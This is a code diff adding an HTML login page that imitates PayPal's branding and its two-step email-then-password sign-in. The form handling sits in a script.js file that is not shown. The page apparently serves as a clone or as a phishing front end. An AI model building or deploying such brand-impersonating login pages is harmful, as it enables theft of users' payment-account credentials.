@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Log In</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- PayPal Logo -->
+        <div class="logo-container">
+            <div class="paypal-logo">
+                <div class="logo-p">P</div>
+                <div class="logo-text">PayPal</div>
+            </div>
+        </div>
+
+        <!-- Main Login Card -->
+        <div class="login-card">
+            <!-- Step 1: Email Input -->
+            <div class="login-step" id="step1">
+                <form class="login-form" id="emailForm">
+                    <div class="input-group">
+                        <input type="text" id="email" name="email" class="form-input" placeholder="Email or mobile number" required>
+                    </div>
+                    
+                    <div class="forgot-link">
+                        <a href="#" class="forgot-email">Forgot email?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn-next">Next</button>
+                </form>
+            </div>
+
+            <!-- Step 2: Password Input -->
+            <div class="login-step" id="step2" style="display: none;">
+                <div class="user-info">
+                    <span class="user-email" id="displayEmail"></span>
+                    <button type="button" class="change-email-btn" id="changeEmailBtn">Change</button>
+                </div>
+                
+                <form class="login-form" id="passwordForm">
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" class="form-input" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <div class="forgot-link">
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn-login">Log In</button>
+                </form>
+            </div>
+
+            <!-- Divider -->
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <!-- Sign Up Button -->
+            <button class="btn-signup" id="signupBtn">Sign Up</button>
+        </div>
+
+        <!-- Language Selector -->
+        <div class="language-selector">
+            <a href="#" class="lang-link">Français</a>
+            <span class="lang-separator">|</span>
+            <a href="#" class="lang-link active">English</a>
+            <span class="lang-separator">|</span>
+            <a href="#" class="lang-link">Español</a>
+            <span class="lang-separator">|</span>
+            <a href="#" class="lang-link">中文</a>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Contact Us</a>
+                <span class="footer-separator">|</span>
+                <a href="#" class="footer-link">Privacy</a>
+                <span class="footer-separator">|</span>
+                <a href="#" class="footer-link">Legal</a>
+                <span class="footer-separator">|</span>
+                <a href="#" class="footer-link">Policy Updates</a>
+                <span class="footer-separator">|</span>
+                <a href="#" class="footer-link">Worldwide</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
